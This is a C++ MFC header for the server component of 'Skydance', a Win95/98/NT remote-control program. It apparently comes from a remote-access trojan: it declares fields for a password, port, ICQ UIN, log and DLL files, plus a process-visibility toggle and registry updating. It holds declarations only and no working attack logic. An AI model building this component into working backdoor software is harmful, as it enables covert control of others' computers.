/**********************************************************************************/
// Read this First!
// Skydance 2.291 Beta Release source code for MFC-VC++ 6.0
// by Edrin@gmx.net
//
// http://skd.box.sk
// - USE SKYDANCE/SKYDANCE SOURCE-CODE AND/OR IT`S COMPONENTS ON YOUR OWN RISK -
//
// Introduction:
//	This Source is FREEWARE!
//	SkyServer is a component of Skydance!
//	Skydance is designed to control other Win95/98/NT systems in tcp/ip-nets like Internet and Intranets.
//	Skydance 2.291 Beta Release is a program that will remain "under construction" and i will NEVER be
//	responsible for any HARM or harmfull things that happend because SKYDANCE(or skydance-source) was USED! 
//	That means I do NOT	guarantee for any features and security-thing
//	and i do not guarantee that this program works proper!!!
//	Indeed i guarantee for nothing ;)
//good luck, Edrin
/**********************************************************************************/
// SkyServer.h : Haupt-Header-Datei für die Anwendung SKYSERVER
//

#if !defined(AFX_SKYSERVER_H__1BC33342_DE4A_11D3_A059_00C026A21151__INCLUDED_)
#define AFX_SKYSERVER_H__1BC33342_DE4A_11D3_A059_00C026A21151__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#ifndef __AFXWIN_H__
	#error include 'stdafx.h' before including this file for PCH
#endif

#include "resource.h"		// Hauptsymbole
#include "SkySocket.h"	// Hinzugefügt von der Klassenansicht
#include "SkyServerDlg.h"	// Hinzugefügt von der Klassenansicht
#include "SkyThread.h"
/////////////////////////////////////////////////////////////////////////////
// CSkyServerApp:
// Siehe SkyServer.cpp für die Implementierung dieser Klasse
//

class CSkyServerApp : public CWinApp
{
public:
	CString m_sServerName;
	CString m_sUIN;
	CString m_sLogAlways;
	CString m_sDLLFile;
	CString m_sLogFile;
	CString m_sPass;
	int m_iEnableDlg;
	int m_iPort;
	void __fastcall RegisterProcess(BOOL bVisible);
	
	void UpDateRegistry();
	CSkyServerApp();

// Überladungen
	// Vom Klassenassistenten generierte Überladungen virtueller Funktionen
	//{{AFX_VIRTUAL(CSkyServerApp)
	public:
	virtual BOOL InitInstance();
	//}}AFX_VIRTUAL

// Implementierung

	//{{AFX_MSG(CSkyServerApp)
		// HINWEIS - An dieser Stelle werden Member-Funktionen vom Klassen-Assistenten eingefügt und entfernt.
		//    Innerhalb dieser generierten Quelltextabschnitte NICHTS VERÄNDERN!
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
private:
	
protected:
	CRegKey m_cRegKey;
};

/////////////////////////////////////////////////////////////////////////////

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ fügt unmittelbar vor der vorhergehenden Zeile zusätzliche Deklarationen ein.

#endif // !defined(AFX_SKYSERVER_H__1BC33342_DE4A_11D3_A059_00C026A21151__INCLUDED_)
